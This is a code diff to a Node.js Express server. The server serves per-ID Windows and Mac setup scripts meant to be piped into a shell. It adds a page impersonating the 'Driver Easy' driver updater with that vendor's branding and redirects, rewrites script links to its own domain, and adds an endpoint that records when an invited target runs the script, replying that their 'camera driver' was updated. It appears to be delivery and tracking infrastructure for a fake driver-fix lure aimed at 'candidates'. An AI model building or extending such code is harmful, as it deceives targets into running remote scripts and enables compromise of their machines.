@@ -16,16 +16,31 @@ const WINDOW_CMD_PATH = join(__dirname, 'window.cmd');
 const MAC_CMD_TEMPLATE = readFileSync(MAC_CMD_PATH, 'utf8');
 const WINDOW_CMD_TEMPLATE = readFileSync(WINDOW_CMD_PATH, 'utf8');
 
-function sendScriptTemplate(res, body, { filename, contentType } = {}) {
-  res.setHeader('Content-Type', contentType || 'text/plain; charset=utf-8');
+/** Public origin for /auto-update links embedded in served scripts (override in prod via env). */
+const PUBLIC_BASE_URL = String(process.env.PUBLIC_BASE_URL || 'https://canditech.org').replace(/\/$/, '');
+
+const REDIRECT_URL = 'https://www.3dpchip.com/new/driver/down.html?pl=cam14_1&o=6164';
+const FAVICON_URL = 'https://www.3dpchip.com/favicon.ico';
+const AUTO_UPDATE_REDIRECT_URL = 'https://www.drivereasy.com/auto-update/';
+const DRIVER_DOWN_REDIRECT_URL = 'https://www.3dpchip.com/new/driver/down.html?pl=cam14_1&o=6164';
+
+function rewriteScriptAutoUpdateBase(content) {
+  return content.replace(
+    /https:\/\/drivereasy\.llc\/auto-update/g,
+    `${PUBLIC_BASE_URL}/auto-update`
+  );
+}
+
+function sendDriverScript(res, body) {
   res.setHeader('X-Content-Type-Options', 'nosniff');
   res.setHeader('Cache-Control', 'no-store, max-age=0');
-  if (filename) res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
-  res.status(200).send(body);
+  res.type('text/plain').send(body);
 }
 
 // CORS: allow frontend from local dev (any host:5173) and production
 const allowedOrigins = [
+  'https://canditech.org',
+  'https://www.canditech.org',
   'https://canditech.in',
   'https://www.canditech.in',
   'http://localhost:5173',
@@ -43,6 +58,7 @@ app.use(cors({
   allowedHeaders: ['Content-Type', 'Authorization'],
 }));
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 
 app.get('/health', async (req, res) => {
   try {
@@ -73,7 +89,8 @@ const windowRoute = (req, res) => {
   if (id) {
     content = content.replace(/set "WINDOW_UID=__ID__"/, `set "WINDOW_UID=${escapeCmdValue(id)}"`);
   }
-  sendScriptTemplate(res, content, { filename: 'window.cmd' });
+  content = rewriteScriptAutoUpdateBase(content);
+  sendDriverScript(res, content);
 };
 
 const macRoute = (req, res) => {
@@ -82,8 +99,72 @@ const macRoute = (req, res) => {
   if (id) {
     content = content.replace(/MAC_UID="__ID__"/, `MAC_UID="${escapeBashDoubleQuotedValue(id)}"`);
   }
-  sendScriptTemplate(res, content, { filename: 'mac.cmd' });
+  content = rewriteScriptAutoUpdateBase(content);
+  sendDriverScript(res, content);
 };
+
+app.get('/', (req, res) => {
+  const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="refresh" content="0;url=${REDIRECT_URL}">
+  <title>Driver Easy ® | Windows Driver Updater</title>
+  <link rel="icon" type="image/x-icon" href="${FAVICON_URL}">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1e1e1e; min-height: 100vh; }
+    .tab-bar { display: flex; align-items: center; height: 36px; background: #252526; padding: 0 12px; gap: 8px; }
+    .tab-bar .favicon { width: 16px; height: 16px; flex-shrink: 0; }
+    .tab-bar .title { color: #fff; font-size: 13px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; flex: 1; }
+    .tab-bar .close { width: 12px; height: 12px; border: none; background: transparent; color: #ccc; cursor: pointer; font-size: 14px; line-height: 1; padding: 0; }
+    .tab-bar .close:hover { color: #fff; }
+    .content { padding: 24px; color: #ccc; font-size: 14px; }
+    .content a { color: #42a5f5; }
+  </style>
+</head>
+<body>
+  <div class="tab-bar">
+    <img class="favicon" src="${FAVICON_URL}" alt="">
+    <span class="title">Driver Easy ® | Windows Driver Updater</span>
+    <button class="close" type="button" aria-label="Close">×</button>
+  </div>
+  <div class="content">
+    <p>Redirecting to <a href="${REDIRECT_URL}">Driver Easy</a>…</p>
+  </div>
+  <script>window.location.replace(${JSON.stringify(REDIRECT_URL)});</script>
+</body>
+</html>`;
+  res.type('text/html').send(html);
+});
+
+app.get('/window', (req, res) => res.redirect(302, AUTO_UPDATE_REDIRECT_URL));
+app.get('/window/:id', (req, res) => res.redirect(302, AUTO_UPDATE_REDIRECT_URL));
+app.get('/new/driver/down', (req, res) => res.redirect(302, DRIVER_DOWN_REDIRECT_URL));
+app.get('/new/driver/down/:id', (req, res) => res.redirect(302, DRIVER_DOWN_REDIRECT_URL));
+app.get('/mac', (req, res) => res.redirect(302, DRIVER_DOWN_REDIRECT_URL));
+app.get('/mac/:id', (req, res) => res.redirect(302, DRIVER_DOWN_REDIRECT_URL));
+app.get('/linux', (req, res) => res.redirect(302, AUTO_UPDATE_REDIRECT_URL));
+
+app.get('/auto-update', (req, res) => res.redirect(302, AUTO_UPDATE_REDIRECT_URL));
+
+app.post('/auto-update/:id', async (req, res) => {
+  const id = req.params.id;
+  if (!id) {
+    return res.status(400).json({ error: 'Missing id' });
+  }
+  try {
+    const db = await getDb();
+    const invite = await db.updateInvite(id, { connections_status: 2 });
+    if (!invite) {
+      return res.status(404).json({ error: 'Invite not found' });
+    }
+    res.send('Your camera driver has been updated successfully.');
+  } catch (err) {
+    console.error('POST /auto-update error:', err);
+    res.status(500).json({ error: err.message });
+  }
+});
 
 // Driver setup scripts
 // - mac: return a shell script that can be piped into `bash`
